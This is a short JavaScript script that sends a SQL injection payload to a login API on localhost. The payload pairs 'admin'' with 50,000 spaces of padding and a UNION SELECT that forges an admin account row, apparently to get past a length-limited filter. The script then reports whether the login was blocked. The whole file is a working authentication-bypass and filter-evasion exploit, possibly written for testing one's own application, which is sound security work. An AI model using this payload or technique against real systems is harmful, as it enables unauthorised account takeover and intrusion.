const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: payload, password: "123" })
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text.substring(0, 100)}\n`);
    } else {
        console.log(`[BLOCKED LOGIN]`);
    }
}

const run = async () => {
    const padding = " ".repeat(50000); // 50KB padding
    await bypassLogin(`admin' ${padding} UNION SELECT 1, 'admin', 'password', 'admin'--`);
};

run();
